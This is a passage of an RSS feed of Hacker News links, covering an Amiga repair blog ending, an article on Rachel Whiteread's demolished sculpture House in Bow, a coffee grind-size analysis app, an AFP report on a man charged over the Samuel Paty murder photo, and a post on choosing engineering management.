<p>I’ve invested weeks of time into this GFX problem research but finally, I had to give up on this project for now. It is still in an unfinished state until we will find a solution to all problems. The project is partially done but it requires more work and I hope to cover it someday in one of the future posts making Amiga 1000 Phoenix great again!</p>
<p>But worry not, this gave birth to a new project which is even more awesome.</p>
<p>Currently, it is a work-in-progress but that is a story for another blog post 🙂</p>
<figure><img src="https://i0.wp.com/imgur.com/puO0E7q.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/puO0E7q.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<h4>OUTRO</h4>
<p>If any of my readers know any solution, hints, or knows where I did mistakes, then please leave a comment here or on FB and Twitter pages.</p>
<p>If you want to get retro gear or hardware modules, please visit <a href="https://retrohax.net/shop/">our shop</a> -&gt; https://retrohax.net/shop/</p>
<p>Please support our work by commenting here and on our <a href="https://www.facebook.com/Retrohax.net">Facebook</a> and <a href="https://twitter.com/RetrohaxN">Twitter</a> pages.</p>
<p>If you want to donate a dead computer then <a href="https://retrohax.net/contact/">drop me an email</a>. Extreme cases are welcome 🙂</p>

 </div>

</article></div>]]>
            </description>
            <link>https://retrohax.net/amiga-1000-project-phoenix-motherborad/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24905247</guid>
            <pubDate>Tue, 27 Oct 2020 07:52:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rachel Whiteread’s House: why was this Bow landmark demolished? (2015)]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 24 (<a href="https://news.ycombinator.com/item?id=24905103">thread link</a>) | @BerislavLopac
<br/>
October 27, 2020 | https://romanroadlondon.com/rachel-whitereads-house-bows-legacy/ | <a href="https://web.archive.org/web/*/https://romanroadlondon.com/rachel-whitereads-house-bows-legacy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
			
<p>Every day people walk past Wennington Green, on the corner of Grove Road and Roman Road, without realising this was the spot on which stood Rachel Whiteread’s controversial inside-out concrete cast of an East End terraced house. Why was this Bow landmark demolished?</p>



<figure><img loading="lazy" width="1024" height="690" src="https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-front-credit-David-Hoffman-1024x690.jpg" alt="Rachel Whiteread's house For Sale signs" srcset="https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-front-credit-David-Hoffman-1024x690.jpg 1024w, https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-front-credit-David-Hoffman-300x202.jpg 300w, https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-front-credit-David-Hoffman-768x518.jpg 768w, https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-front-credit-David-Hoffman.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Rachel Whiteread’s house For Sale © David Hoffman</figcaption></figure>



<h2>Wennington Green, Bow, London</h2>



<p>At the intersection of Roman Road and Grove Road lies Wennington Green – a patch of land in <a href="https://romanroadlondon.com/mile-end-park-history/" target="_blank" rel="noreferrer noopener">Mile End Park </a>principally sculpted by flying bombs. In fact, an English Heritage plaque on the railway bridge a little further down Grove Road commemorates the first one to strike London.</p>



<p>The blitz largely levelled the hundred or so turn-of-the-century terraces, common stock of the working class East End, on what is now the Green but up until the early ‘90s a row of dilapidated dwellings persisted. These residences were mostly derelict, abandoned and occasionally squatted, but for one, ex-docker Mr Sidney Gale of No. 193, a condemned house remained a home.</p>



<p>Indeed, in 1993, the final row was fated to be demolished as part of Tower Hamlet’s council’s plan to create a Green Corridor, unifying the broken line of parkland between the Isle of Dogs and the established lung of <a href="https://romanroadlondon.com/victoria-park-east-london-bow/">Victoria Park</a>. It was a means to cleanse the area of the legacy of prefabs that had homed the dislocated population post-war and a redemptive space for those in the high-rise accommodation which had replaced the traditional terraces. ‘What people who live in tower blocks want is parkland,’ declared Councillor Eric Flounders.</p>



<p>Yet psychogeographer Iain Sinclair was sceptical of the council’s motives, calling it ‘an Arcadia for the underclass… the whole scheme was a disinterested attempt at municipal aesthetics’. Pointedly, the area was in direct sight of Mrs Thatcher’s commerce baby, Canary Wharf, and the call for a Green was not a far cry from the original motivations to create Victoria Park, opened in 1845. Vicky Park is the oldest purpose built recreation ground in London, conceived to curb disease contracted in damp and cramped conditions and as a means harness working-class wildness. Indeed, Bow is an area rich with connotations of a strong working-class community, but also radicalism and revolt.</p>



<p>Mr Gale forcefully resisted eviction from No. 193 by the council for a number of years, even festooning the property with banners to affirm his unrelenting presence, but, realising his campaign was ultimately futile, he eventually yielded and was re-homed nearby. Gale’s loss was artist Rachel Whiteread’s gain. The practitioner had been seeking a condemned property in London for over two years to realise a project which was essentially a development upon her Turner Prize nominated sculpture, Ghost (1990); a room-sized cast of a bedsit contained in a Victorian property in Archway.</p>



<p>Whiteread, supported by art commissioners Artangel, approached the London Borough of Tower Hamlets&nbsp;council about utilising the property and the authorities duly consented. In the beginning, the council were of the opinion that, ‘It won’t cost the neighbourhood a penny and will provide an unusual landmark for the area,’ however, by the time the bricks were removed and the sculpture was exposed, Councillor Flounders, Chair of Bow Parks Board, denounced it as ‘excrescent.’</p>



<h2>Building Rachel Whiteread’s House</h2>



<figure><img loading="lazy" width="1024" height="692" src="https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-credit-David-Hoffman-1024x692.jpg" alt="Rachel Whiteread's House on Grove Road in Bow, photo by David Hoffman" srcset="https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-credit-David-Hoffman-1024x692.jpg 1024w, https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-credit-David-Hoffman-300x203.jpg 300w, https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-credit-David-Hoffman-768x519.jpg 768w, https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-credit-David-Hoffman.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Rachel Whiteread’s house view of Grove Road © David Hoffman</figcaption></figure>



<p>To make House, Whiteread used the physical house as&nbsp;a&nbsp;mould, making a cast from the interior by spraying a skin of liquid concrete around a metal armature constructed to support the weight of the work. Coating the whole house took over a month and an additional ten days were needed for the concrete to cure and set. Once solid, scaffolding was erected and Whiteread and her assistants began to remove the exterior brick structure.</p>



<p>What was revealed was an uncanny sight – the concrete impressed with the idiosyncrasies of over a century of domestic habitation. Depressions translated into protrusions; the industrial material betraying past human intimacies: soot marking the fire; yellow paint from a top-floor bedroom. The floors in-between stories could not be cast so, as local Markham Hall recalls, it resembled a ‘wedding cake.’ But the marriage at hand, between the art world and the East End, was to be short-lived and volatile.</p>



<h2>Reactions to Rachel Whiteread’s House</h2>



<p>It was essentially a neutral process, with no specific moral agenda, but Whiteread conceded ‘I knew of course, while I was making House, it had a political dimension. You can’t make a cast of a house in a poor area of London and not be political.’ Yet it became ‘far more political than I could have predicted.’ Seemingly, the council had also underestimated its resonance, as it quickly became front-page news, attracting scores of art-pilgrims and causing traffic chaos. Its status was even brought to debate in the House of Commons. The council couldn’t wait to get rid of the work fast enough, coming to regard it as a politically embarrassing monument to an impoverished history and standing in the way of the construction of a less threatening green space.</p>



<figure><img loading="lazy" width="1024" height="690" src="https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-graffiti-%C2%A9David-Hoffman-1024x690.jpg" alt="Rachel Whiteread's house with Wot For Why Not graffiti © David Hoffman" srcset="https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-graffiti-%C2%A9David-Hoffman-1024x690.jpg 1024w, https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-graffiti-%C2%A9David-Hoffman-300x202.jpg 300w, https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-graffiti-%C2%A9David-Hoffman-768x518.jpg 768w, https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-graffiti-%C2%A9David-Hoffman.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Wot For? Why Not? © David Hoffman</figcaption></figure>



<p>People reacted to House so strongly as it transcended the individual and became an archetype; an emblem for the area’s time-honoured mode of living. Indeed, it raised pressing questions regarding degrading housing stock and what should be done with it, the creeping gentrification of a historically tight working class community and scepticism towards the authority of those instigating change for the supposed ‘greater good’. In whose name was this change really for? And poignantly, it confronted these questions on its own material terms – concrete being the material used to fix the original Victorian House’s bricks; the embossed surface betraying the umbilical cords of pipes and power-lines which linked the individual house with the local, national and global public.</p>



<p>At base, Whiteread made an empty space, the negative void of the vacated property, into a positive object but insists ‘the work is to do with absence not presence.’ Implicitly, House was defined by the object it was not. When one refers to a ‘house’ we generally mean the façade as publicly viewed from the street, the interior is intimate – that is the home. Whiteread’s sculpture was resolutely an interior; an unsettling mass of inside, out.</p>



<p>The form elicited unease as when we have an intimate relationship with a space, we start to ignore its intricacies, instead handling navigating through the general form unconsciously. Thus, the sculpture was uncanny as it solidified the overlooked, demanding a long-looking, deep contemplation, as one attempted to decipher the inverted forms. Whiteread neglected to furnish her House with meaning but it was predominantly envisioned as what the populace of Bow would soon lose sight of. The interior, a family home, was left out in the cold and significantly, Whiteread chose not to cast the attic space, as if riffing on the idiom ‘left with no roof over their heads.’</p>



<p>It’s understandable then, that there was some resentment from locals towards House as they perceived it to be adding insult to injury over the demolition of such homes in the area, and a crassness in exposing working-class abode for the ‘arty’ leisure classes. Yet, this wasn’t just a case of Art World vs. East Enders, the opinions were split within both camps: in the Art World, Andrew Graham-Dixon proclaimed it ‘a strange and fantastical object which also amounts to one of the most extraordinary and imaginative public sculptures created by an English artist this century.’ To Brian&nbsp;Sewell, it was a ‘meritless gigantism.’ Sewell’s scorn found resonance in one local’s assertion that ‘an engineer could have done it; I don’t see it as creative.’ Whereas, another neighbour to the site regarded it as ‘brilliant,’ reckoning it to be ‘a new way of looking at traditional things.’</p>



<p>House’s evicted resident, Mr Gale, protested, ‘They’re taking the wee-wee.’ He questioned, ‘How can they get grants for arts projects when we can’t get grants for homes? I could have bought a new home for my family with this money.’ His sentiment was echoed in graffiti scrawled on the sculpture: ‘WOT FOR?’ Another renegade scribe rebuffing ‘Why not!’</p>



<p>House’s economics became even more contentious when Whiteread won the £20,000 Turner Prize for the work (the first woman to receive the honour), and then £40,000 from the rebel K Foundation (composed of members of the defunct pop group KLF) for the ‘worst artist of the year.’ Whiteread split the latter money between Shelter, a charity for the London’s homeless, and a fund to supplement young artists. On the same day, the&nbsp;Council made the decision to refuse House a stay of execution. By this time, many people (philanthropists, dealers, galleries) had offered to purchase House, but money offered to the Council to retain its presence was blasted by the authorities as ‘bribes.’ In any case, Whiteread was adamant that the sculpture was ‘absolutely specific to the site’ thus preferred its destruction to relocation.</p>



<p>The bulldozers came on January 11th 1994. The <em>East London Advertiser</em> reports that ‘art lovers’ chained themselves to the railings in attempt to save the work, quoting one as protesting, ‘We’re doing this because House represents the destruction of not only homes but whole communities in East London.’ Another suggested its removal was a sacrilegious act, perceiving House as ‘a headstone to the houses that were here.’ But the sculpture’s fate was sealed. As Whiteread succinctly mused ‘it took three and a half years to develop, four months to make, and thirty minutes to demolish.’</p>



<h2>The legacy of Rachel Whiteread’s House</h2>



<p>The Houseless Park has now had over 20 years to bed in to the community’s psyche and flourish naturally. In all of the articles and art history books I have trawled to substantiate …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://romanroadlondon.com/rachel-whitereads-house-bows-legacy/">https://romanroadlondon.com/rachel-whitereads-house-bows-legacy/</a></em></p>]]>
            </description>
            <link>https://romanroadlondon.com/rachel-whitereads-house-bows-legacy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24905103</guid>
            <pubDate>Tue, 27 Oct 2020 07:21:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MIOS: IBM 5150 BIOS Replacement Project]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24904148">thread link</a>) | @userbinator
<br/>
October 26, 2020 | http://www.mtmscientific.com/mios.html | <a href="https://web.archive.org/web/*/http://www.mtmscientific.com/mios.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.mtmscientific.com/mios.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24904148</guid>
            <pubDate>Tue, 27 Oct 2020 03:09:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An App to Measure Your Coffee Grind Size Distribution]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24903834">thread link</a>) | @occupy_paul_st
<br/>
October 26, 2020 | https://coffeeadastra.com/2019/04/07/an-app-to-measure-your-coffee-grind-size-distribution-2/ | <a href="https://web.archive.org/web/*/https://coffeeadastra.com/2019/04/07/an-app-to-measure-your-coffee-grind-size-distribution-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-1314">

	

	
			<figure>
				<img width="1568" height="1068" src="https://coffeeadastra.files.wordpress.com/2019/01/screenshot_coffee_grind_size.png?w=1568" alt="" loading="lazy" srcset="https://coffeeadastra.files.wordpress.com/2019/01/screenshot_coffee_grind_size.png?w=1568 1568w, https://coffeeadastra.files.wordpress.com/2019/01/screenshot_coffee_grind_size.png?w=150 150w, https://coffeeadastra.files.wordpress.com/2019/01/screenshot_coffee_grind_size.png?w=300 300w, https://coffeeadastra.files.wordpress.com/2019/01/screenshot_coffee_grind_size.png?w=768 768w, https://coffeeadastra.files.wordpress.com/2019/01/screenshot_coffee_grind_size.png?w=1024 1024w, https://coffeeadastra.files.wordpress.com/2019/01/screenshot_coffee_grind_size.png 2836w" sizes="(max-width: 1568px) 100vw, 1568px" data-attachment-id="977" data-permalink="https://coffeeadastra.com/screenshot_coffee_grind_size/" data-orig-file="https://coffeeadastra.files.wordpress.com/2019/01/screenshot_coffee_grind_size.png" data-orig-size="2836,1932" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot_coffee_grind_size" data-image-description="" data-medium-file="https://coffeeadastra.files.wordpress.com/2019/01/screenshot_coffee_grind_size.png?w=300" data-large-file="https://coffeeadastra.files.wordpress.com/2019/01/screenshot_coffee_grind_size.png?w=750">			</figure><!-- .post-thumbnail -->

		
	<div>
		
<p>[Edit April 25 2019: Please note <strong>this is not an iPhone or Android app</strong>, and I have no plans to release it as such. You can use your phone or any other camera to take pictures of your ground coffee, but then you need to install the application on either OS X or through Python (on any operating system) to analyze the data. <a href="https://github.com/jgagneastro/coffeegrindsize/archive/master.zip">Download the application package here</a>.]</p>



<p>Today I would like to present an OS X application I have been developing for a few months. It turns out writing Python software for coffee is a great way to relax after a day of writing Python software for astrophysics.</p>



<p>When I started being interested in brewing specialty coffee a few years ago, one of the first things that irritated me was our inability to recommend grind sizes for different coffee brewing methods, or to compare the quality of different grinders in an objective way. Sure, some laboratories have laser diffraction equipment that can measure the size of all particles coming out of a grinder, but rare are the coffee geeks that have access to these multi-hundred thousands of dollars kinds of equipment.</p>



<p>At first, I decided to take pictures of my coffee grounds spread on a white sheet, and to use an old piece of software called <a href="https://imagej.nih.gov/ij/">ImageJ</a>, developed by the National Institutes of Health mainly to analyze microscope images, to obtain a distribution of the sizes of my coffee grounds. This worked decently well, and allowed me to start comparing different grinders. Then <a href="https://www.scottrao.com/">Scott Rao</a> made me realize that a stand-alone application that doesn’t need a complicated installation and that is dedicated to coffee would be of interest to many people in the coffee industry. Probably just the 10% geekiest of them, but that’s cool.</p>



<p>I’m hoping that this application will help us understand the effects of particle size distributions on the taste of coffee. I don’t think the industry really kept us in the loop with all the laser diffraction experiments, so hopefully we can help ourselves as a community.</p>



<p>If you are interested in measuring the particle size distribution of your grinder, then this app is for you ‒ and it’s free. I placed it as “open source” on <a href="https://github.com/jgagneastro/coffeegrindsize">GitHub</a>, so if you are a developer, you are welcome to send me suggestions in the form of <em>push requests</em> (the developers will know what that means).</p>



<p>If you would like to get started, I suggest you read this quick <a href="https://github.com/jgagneastro/coffeegrindsize/blob/master/Help/coffee_grind_size_installation.pdf">installation guide</a>, which will explain how to download the app and run it even though I am not a registered Apple Developer. Then, you can choose to either read this <a href="https://github.com/jgagneastro/coffeegrindsize/blob/master/Help/coffee_grind_size_summarized_manual.pdf">quick summary</a> that will get you running with the basics, or this <strong><em>very</em></strong> detailed and wordy <a href="https://github.com/jgagneastro/coffeegrindsize/blob/master/Help/coffee_grind_size_manual.pdf">user manual</a> that will guide you through all the detailed options the application offers you.</p>



<p>I would like to show you an example of what can be done with the software. Below, I am comparing the particle size distribution of the Baratza Forté grinder, which uses 54 mm flat steel burrs, with that of the Lido 3 hand grinder, which uses 48 mm conical steel burrs. I set both grinders in a way that produces a similar peak of average-sized particles with diameters around 1 mm, but as you can see, the particle size distributions are very different ! The Forté generates way less fines (with diameters below 0.5 mm) and slightly less boulders (with diameters of approximately 2 mm), which is indicative of a better quality grinder.</p>



<figure><img data-attachment-id="976" data-permalink="https://coffeeadastra.com/lido3_size9_file10_hist_mass_diam/" data-orig-file="https://coffeeadastra.files.wordpress.com/2019/01/lido3_size9_file10_hist_mass_diam.png" data-orig-size="1000,780" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="lido3_size9_file10_hist_mass_diam" data-image-description="" data-medium-file="https://coffeeadastra.files.wordpress.com/2019/01/lido3_size9_file10_hist_mass_diam.png?w=300" data-large-file="https://coffeeadastra.files.wordpress.com/2019/01/lido3_size9_file10_hist_mass_diam.png?w=750" src="https://coffeeadastra.files.wordpress.com/2019/01/lido3_size9_file10_hist_mass_diam.png" alt=""><figcaption>An example of figure that can be generated with the coffee grind size software. Each red bar corresponds to one kind of particle diameter generated by the Lido 3 grinder (smallest particles correspond to the leftmost bar, largest ones correspond to the rightmost bar), and their heights correspond to the total contribution of these kinds of particles, by mass. As you can see, the particles that contribute to the largest amount of mass have sizes just above 1 mm. The red circle shows the average particle diameter for the Lido 3, and the horizontal bars show the “characteristic width” of the distribution – this corresponds to the width that covers approximately 68% of all the distribution. Similarly, the blue line and the blue circle describe the distribution of the Forté grinder.</figcaption></figure>



<p>For now, the app is only intended to be used on OS X computers. But if you are running any other kind of system and know your way around Python, you can always download it directly from <a href="https://github.com/jgagneastro/coffeegrindsize">GitHub</a> and run it with your own installation of Python 3.</p>



<figure><video controls="" src="https://www.dropbox.com/s/66ug5i9bkhrghef/screencap_coffeegrindsize.mov?raw=1"></video><figcaption>This is an example of how to use the coffee grind size application.</figcaption></figure>



<p>I would like to thank Scott Rao for his excitement when I shared this project idea with him, and for beta testing the software. I would also like to thank Alex Levitt, Mitch Hale, Caleb Fischer, Francisco Quijano and Victor Malherbe for beta testing the software.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

			<div>
	
	<p>
		I’m a researcher in astrophysics at the Rio Tinto Alcan planetarium of Espace pour la Vie, in Montreal.		<a href="https://coffeeadastra.com/author/jgagneastro/" rel="author">
			View more posts		</a>
	</p><!-- .author-description -->
</div><!-- .author-bio -->
	
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://coffeeadastra.com/2019/04/07/an-app-to-measure-your-coffee-grind-size-distribution-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24903834</guid>
            <pubDate>Tue, 27 Oct 2020 02:02:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Man charged for 'liking' photo of murdered French teacher]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 105 (<a href="https://news.ycombinator.com/item?id=24902197">thread link</a>) | @baybal2
<br/>
October 26, 2020 | https://www.rfi.fr/en/wires/20201025-man-charged-liking-photo-murdered-french-teacher | <a href="https://web.archive.org/web/*/https://www.rfi.fr/en/wires/20201025-man-charged-liking-photo-murdered-french-teacher">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
                            <p>Rennes (France) (AFP)</p>
                        <p>A young man who "liked" a gruesome Twitter picture showing French teacher Samuel Paty after he was murdered has been charged with glorifying terrorism, French authorities said Sunday.</p><p>Paty was attacked and killed on the street for showing his students cartoons of the Prophet Mohammed in a class on free speech.</p><p>His killer, an 18-year-old Chechen refugee who had been living in France since he was a child, was shot dead by police. Before his death he posted a picture of the teacher's severed head on Twitter.</p><p>The 22-year-old man charged on Sunday is also of Chechen origin, the public prosecutor in the central town of Blois, where he lives, said.</p><p>He was already on the radar of the authorities for having endorsed a massacre at the satirical magazine Charlie Hebdo that first published the Mohammed cartoons.</p><p>Several knives and other weapons were found at his home, prosecutor Frederic Chevallier.</p><p>The man denied being radicalised, Chevallier added.</p><p>Since Paty's murder on October 16 the French authorities have launched a clampdown on radical Islam.</p><p>Police have carried out dozens of raids on individuals and organisations suspected of supporting or abetting extremism.</p><p>Depictions of the Prophet Mohammed are considered sacrilegious by many Muslims.</p><p>But in France, which has a long tradition of satirising religion, they are seen as symbolic of free speech.</p>
            <p>© 2020 AFP</p>        </div></div>]]>
            </description>
            <link>https://www.rfi.fr/en/wires/20201025-man-charged-liking-photo-murdered-french-teacher</link>
            <guid isPermaLink="false">hacker-news-small-sites-24902197</guid>
            <pubDate>Mon, 26 Oct 2020 22:20:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Choosing the Management Track]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24901940">thread link</a>) | @luu
<br/>
October 26, 2020 | https://blog.danielna.com/choosing-the-management-track/ | <a href="https://web.archive.org/web/*/https://blog.danielna.com/choosing-the-management-track/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>Several months ago a friend of mine reached out to me because he was considering
changing from an individual contributor (IC) role to an engineering management (EM)
role at work. Given the fact that I’ve bounced back and forth a couple times, he
wanted to pick my brain as to what I thought the tradeoffs were and why I
ultimately went back into management.</p>

<p>He’s not the only person to reach out to me about this topic (in fact, a different
friend reached out a week later) so I figured it’d be useful to write a blog post
consolidating my thoughts. I’ll separate this post into two sections: some
significant and perhaps unintuitive changes that are relevant to someone
considering moving from IC to EM, and my personal motives.</p>

<h2 id="the-differences">The differences</h2>

<h3 id="1-you-wont-code-anymore">1: You won’t code anymore.</h3>

<p>I once heard some tongue-in-cheek advice about moving to management: “If the
thought of never coding anymore turns your life to ash, don’t move to management.”
Turns out it’s true.</p>

<p>The “should managers still code?” question is probably the most hotly debated
question about the role change, and I’m taking a side: no. Maybe not immediately
after the switch, because your team may be small enough that it needs your
technical contribution or you may still be the subject matter expert, but as
you climb the management ladder you will move further away from doing any
implementation work. In fact, I’ll argue that managers who cling to coding work
hold back the output of their team.</p>

<p>A popular assumption is this is an outflow of your technical skills becoming
stale. It’s not. I’m not saying it’s impossible, especially on a very extended
timetable that involves core structural shifts in industry practice, but I think
those shifts (and your inability to ramp up on them assuming a strong technical
base - see “<a href="https://charity.wtf/2017/05/11/the-engineer-manager-pendulum/">The Engineer/Manager Pendulum by Charity Majors</a>”)
are rare. The principles of sound software engineering practice are timeless.
But either track requires focus. It’s not that you can’t code, it’s more that
you shouldn’t - your schedule simply won’t allow it.</p>

<p>As a manager, your schedule will become so unavoidably non-deterministic that
you cannot be relied upon by the rest of your team to ship code changes on an
expected cadence. You won’t be able to respond to questions or pull requests
involving the code you previously wrote. You won’t have the bandwidth to ship
updates to that code when requirements change. And in the big picture this is a
problem, because teams distributing and shipping work in concert is the backbone
of successful software development.</p>

<p>The reason for this non-deterministic schedule is rooted in my second difference:</p>

<h3 id="2-management-forces-you-to-care-more-about-everything">2: Management forces you to care more about everything.</h3>

<p>Generally speaking, as an IC the measure of your impact is your individual technical
contribution: work scoped, code successfully deployed to production, RFCs proposed
and reviewed, etc. While this often involves working with others, at the end of
the day you are largely in control of the factors that determine your output. You
can sit at your desk and work more hours. You can write more / better code. You
can add more tests. The success or failure of your technical efforts have more
to do with your effort than anyone else’s.</p>

<p>One of my beliefs about management is borrowed directly from <a href="https://amzn.to/30XV84J">High Output Management by Andy Grove</a>:
the measure of a manager is the output of the organization underneath them. Unfortunately
the factors that sum to a team’s output are far fuzzier than the factors that sum
to an IC’s output. And it’s not as simple as adding up all of the discrete technical
outputs of your ICs because team output is measured via the delivery of coordinated,
high-quality projects over time.</p>

<p>Here are some not uncommon situations:</p>

<ul>
  <li>A team of talented ICs ships high quality work. But they feel no buy-in or
camaraderie within the team or greater organization, and the entire team turns
over within a year. The constant hiring and onboarding makes it difficult to rely
on this team for time-sensitive tasks or reliable ownership over part of a codebase.</li>
  <li>A set of teams spends an extended time working on a project that gets killed
before launch. Turns out it wasn’t the right thing to build. The ICs on that team
turned out high quality work but to a useless outcome.</li>
  <li>A team of talented ICs ships high quality work, but they have one or two very
senior brilliant jerks. Other teams do not like engaging with these brilliant
jerks so they avoid interacting with the team. Consequently the high quality work
of this team does not have organizational impact.</li>
</ul>

<p>A common thread between each of these scenarios is that ICs are delivering high
quality work. Another thread is that the high quality work ultimately doesn’t
benefit the organization. Retention problems, working on the wrong things, toxic
cultures - these are all examples of management failure.</p>

<p>There’s no checklist for building non-toxic cultures or a team that ICs want to
stay on. Engineering teams are fortunate if they’re told exactly what to build
every quarter to meet the growing technical and business needs of the company
but I’ve never found that to be true. The poor definition of these ideas makes
management hard. And it puts the burden on the manager to maintain their own
level of vigilance that all of these things - personalities, priorities, culture,
etc. - stay on track.</p>

<p>As a small but illustrative example of something that’s different as an IC than
a manager: morning standup. When I was an engineer, there were more than a few
times during morning standups when I didn’t pay attention unless I was giving
my own update. And frankly it didn’t seem to matter much, especially if the other
updates were concerning different workstreams than the one I was currently focused
on.</p>

<p>As a manager, I can’t afford not to pay attention to every update during standup
because I am ultimately accountable for the delivery of <em>every workstream</em>. Not
only am I trying to identify and surface team-wide blockers, but I need to know
when a junior teammate sounds like they’re spinning their tires or when a senior
teammate sounds burnt out. I’m mentally noting points I need to follow up on
during my weekly 1:1s, what projects feel like they’re falling off original
timetables or communication problems my teammates are encountering across the
organization. Is a teammate overwhelmed? Is a teammate dragging their heels?
What if I’m hearing reports that a teammate has been toxic in meetings? These are
all concerns running constantly in the back of my mind.</p>

<p>This is the root of the non-deterministic schedule from the first point. Say I
smell one of these things - a teammate is very disengaged and unhappy? A project
is going off the rails? A teammate suddenly gives their two week notice? These
are my fires now.</p>

<p>Gone are the weeks of deterministic bandwidth calculated via possible work hours
divided by ticket estimations. And that unpredictability means my outdated pull
request that unblocks another teammate goes days or weeks without being merged.</p>

<p>Is there room every once in a while for an EM to work on a non-blocking PR just
to scratch their coding itch? Probably. Is the work time you spent working on that
nice-to-have PR better spent on a management responsibility? Probably.</p>

<p>My advice: find time to scratch the coding itch outside of work.</p>

<p>A side effect of caring more about everything means management costs you more
emotionally. When hardship or tragedy strikes the life of a teammate and it affects
their ability to work, I’m often the first to know. Depending on the sensitivity
of the issue sometimes I’m the only one to know. Not only am I responsible for the
practical fallout of their absence, but I wouldn’t be successful in my job if I
didn’t genuinely care about the wellbeing of my teammates. And in my experience
it’s not free to know people you care about are suffering.</p>

<h3 id="3-management-creates-an-unavoidable-power-hierarchy">3: Management creates an unavoidable power hierarchy.</h3>

<p>As a manager you have direct power to decide your reports’ continued employment
and compensation in a manner in which they cannot do for you, which means you
have more power over them at work than they do over you. This isn’t a statement
of right or wrong, this is a statement of fact.</p>

<p>I think there are a few non-obvious practical implications of this power hierarchy:</p>

<p><strong>You will feel more compelled to toe the company line.</strong></p>

<p>You represent the company now within your sphere of influence. While I don’t
think moving into management means you lose your capacity for independent thought,
the health of an organization often depends on its leaders’ ability to disagree
and commit.</p>

<p>This particularly comes to a head during times of crises, as those on your team
will look to you as a steadying force and source of information. By virtue of your
title you may know not-yet-public information and be expected to keep that information
private until the appropriate plans are in place, all for the good of the company.
Sometimes that news will be devastating and you’ll take heat for keeping it quiet
from people who trusted you. That’s part of the job.</p>

<p><strong>It can be hard to manage friends.</strong></p>

<p>The foundations of friendship are things like equality, honesty, and transparency,
principles which don’t always jive with a management relationship. Management is a
power hierarchy (<code>!equality</code>), and sometimes you’ll have to disagree and commit or
toe the party line (<code>!honesty</code> / <code>!transparency</code>).</p>

<p>The alternative is special treatment for your friends, which is a management failure
because nepotism undermines your credibility as a leader. And in the worst case,
you are in the unenviable position of having to terminate a friend’s employment.
